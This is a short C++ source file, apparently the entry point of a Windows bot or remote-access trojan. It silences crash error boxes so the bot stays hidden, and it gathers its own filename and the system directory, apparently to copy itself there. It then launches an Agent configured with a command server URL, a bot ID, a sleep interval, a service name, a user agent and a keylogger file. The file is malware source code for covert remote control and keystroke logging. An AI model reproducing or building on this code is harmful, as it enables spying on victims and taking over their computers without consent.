#include "agent.h"

int WINAPI WinMain(HINSTANCE hInstance,	HINSTANCE hPrevInstance,	LPSTR lpCmdLine,	int nCmdShow)
{
	
	char sysdir[MAX_PATH], fname[_MAX_FNAME], ext[_MAX_EXT], rfilename[MAX_PATH], cfilename[MAX_PATH];

	// hide system messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	Agent *ag = new Agent(SERVER_URL, BOT_ID, SLEEP_INTERVAL,SERVICE_NAME, USER_AGENT, KEYLOGGER_FILE);
	ag->run();

	return 0;
}
